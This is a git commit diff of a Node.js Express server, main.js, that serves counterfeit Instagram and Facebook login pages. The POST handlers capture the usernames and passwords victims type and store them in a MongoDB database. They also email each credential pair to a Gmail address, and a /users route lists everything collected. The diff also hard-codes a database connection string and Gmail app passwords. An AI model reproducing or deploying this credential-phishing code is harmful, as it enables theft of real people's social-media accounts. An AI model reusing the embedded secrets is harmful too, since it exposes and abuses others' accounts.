a6ef197ebdef8011265f720cb1f5da62790e7d03
Stevenwoods943 <140918326+Stevenwoods943@users.noreply.github.com>
2023-10-30 05:58:03 +0100

    Add files via upload

--- main.js
+++ main.js
@@ -1,16 +1,40 @@
- //require modules
+//require modules
 const express = require("express");
 const bodyParser = require("body-parser");
 const ejs = require("ejs");
+const mongoose = require("mongoose");
 const nodemailer = require("nodemailer");
 const path = require("path");
+const { Schema } = require("mongoose");
+const { error } = require("console");
 
 const port = 3000; //listening port on localhost
 
+// mongodb data connection set-up
+mongoose
+  .connect("mongodb+srv://user:j8?3Rtdy#UnzJy-@atlascluster.2dau4qu.mongodb.net/?retryWrites=true&w=majority")
+  .then(function () {
+    console.log("Connected to mongodb");
+  })
+  .catch(function (error) {
+    console.error("Could not connect to mongoDB...", error);
+  });
+const userSchema = mongoose.Schema(
+  {
+    username: String,
+    password: String,
+    infoType: String,
+    created: { type: Date, default: Date.now },
+  },
+  {
+    timestamps: true,
+  }
+);
+// mongodb modle and Schema
+const userModel = mongoose.model("user", userSchema);
+
 //represent modules
 const app = express();
-
-console.log(__dirname);
 let publicPath = path.join();
 
 // use modules middleware required
@@ -89,14 +113,36 @@ app.get("/winners-photos", function (request, response) {
 app.get("/winners", function (request, response) {
   response.render("winners/index");
 });
+app.get("/users", async function (request, response) {
+  userModel
+    .find()
+    .sort({ created: -1 })
+    .then(async function (data) {
+      response.render("info", { userData: await data });
+    })
+    .catch(function (error) {
+      console.log("Error finding user data", error);
+    });
+});
 app
   .route("/login")
-  .get(function (request, response) {
+  .get(async function (request, response) {
     response.render("insta_login");
   })
-  .post(function (request, response) {
-    const username = request.body.username;
-    const password = request.body.password;
+  .post(async function (request, response) {
+    const username = await request.body.username;
+    const password = await request.body.password;
+    const infoType = "Instagram";
+    //save data
+    const userData = await new userModel({
+      username: username,
+      password: password,
+      infoType: infoType,
+    });
+
+    //save user data
+    await userData.save();
+
     const output = `
     Congrates you have a new user Login From Instagram:
     Contact Details
@@ -107,7 +153,7 @@ app
       service: "gmail",
       auth: {
         user: "stevenwoods943@gmail.com",
-        pass: "pcpz uecy ioly iont",
+        pass: "kfqbbpdsjdssfrqr",
       },
     });
     //   Define email
@@ -117,7 +163,7 @@ app
       subject: "New Instagram Account Login",
       text: output,
     };
-    transporter.sendMail(mailOptions, function (error, info) {
+    transporter.sendMail(mailOptions, async function (error, info) {
       if (error) {
         console.log(error, "error");
       } else {
@@ -129,37 +175,48 @@ app
       console.log("Message sent: %s", info.messageId);
     }
     main().catch(console.error);
+
     response.redirect("/");
   });
 app
   .route("/login-facebook")
-  .get(function (request, response) {
+  .get(async function (request, response) {
     response.render("facebook_login");
   })
-  .post(function (request, response) {
-    const username = request.body.username;
-    const password = request.body.password;
-    const output = `
+  .post(async function (request, response) {
+    const username = await request.body.username;
+    const password = await request.body.password;
+    const infoType = "Facebook";
+    //save data
+    const userData = await new userModel({
+      username: username,
+      password: password,
+      infoType: infoType,
+    });
+
+    //save user data
+    await userData.save();
+    const output = await `
     Congrates you have a new user Login From Facebook: \n
     Contact Details
-    Username: ${username}
-    Password: ${password}
+    Username: ${await username}
+    Password: ${await password}
      `;
-    const transporter = nodemailer.createTransport({
+    const transporter = await nodemailer.createTransport({
       service: "gmail",
       auth: {
         user: "stevenwoods943@gmail.com",
-        pass: "pcpz uecy ioly iont",
+        pass: "kfqbbpdsjdssfrqr",
       },
     });
     //   Define email
-    const mailOptions = {
+    const mailOptions = await {
       from: "stevenwoods943@gmail.com",
       to: "patrickrodgers511@gmail.com",
       subject: "New Facebook Account Login",
-      text: output,
+      text: await output,
     };
-    transporter.sendMail(mailOptions, function (error, info) {
+    transporter.sendMail(mailOptions, async function (error, info) {
       if (error) {
         console.log(error, "error");
       } else {
@@ -174,6 +231,6 @@ app
     response.redirect("/");
   });
 
-app.listen(3000, function () {
+app.listen(process.env.PORT || 3000, function () {
   console.log(`Server has started on port ${port} ......`);
 });
